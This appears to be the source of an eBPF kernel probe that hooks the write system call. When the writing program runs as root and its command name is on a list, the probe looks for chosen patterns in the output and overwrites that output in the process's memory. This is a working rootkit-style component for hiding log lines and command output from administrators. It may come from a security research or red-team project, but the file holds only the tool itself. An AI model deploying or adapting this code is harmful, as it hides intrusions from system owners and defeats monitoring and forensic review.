//go:build ignore
#include "vmlinux.h"
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "hide_log.h"

SEC("kprobe/__x64_sys_write")
int BPF_KPROBE(trace_write)
{
    struct pt_regs *real_regs = PT_REGS_SYSCALL_REGS(ctx);

    u32 uid = (u32)bpf_get_current_uid_gid();
    if (uid != 0)
        return 0;

    char comm[TASK_COMM_LEN] = {};
    bpf_get_current_comm(&comm, sizeof(comm));

    int found_command = 0;
    for (int c = 0; c < MAX_COMMANDS; c++) {
        if (__builtin_strncmp(comm, commands[c].command, commands[c].len) == 0) {
            found_command = 1;
            break;
        }
    }
    
    if (!found_command) {
        return 0;
    }

    const char *buf = (const char *)PT_REGS_PARM2_CORE_SYSCALL(real_regs);
    u64 count = PT_REGS_PARM3_CORE_SYSCALL(real_regs);

    if (count <= 0 || buf == NULL)
        return 0;
    count = count > MAX_BUF ? MAX_BUF : count;

    char data[MAX_BUF] = {};
    if (bpf_core_read_user_str(&data, count, buf) < 0)
        return 0;

    u32 key = PATCH_KEY;
    char *patch = bpf_map_lookup_elem(&patch_map, &key);
    if (!patch)
        return 0;

    for (int p = 0; p < MAX_PATTERNS; p++) {
        int limit = count > patterns[p].len ? count - patterns[p].len : 0;
        for (int i = 0; i < limit; i++) {
            if (__builtin_memcmp(&data[i], patterns[p].pattern, patterns[p].len) == 0) {
                bpf_probe_write_user((void *)buf, patch, count);
                return 0;
            }
        }
    }

    return 0;
}
char LICENSE[] SEC("license") = "GPL";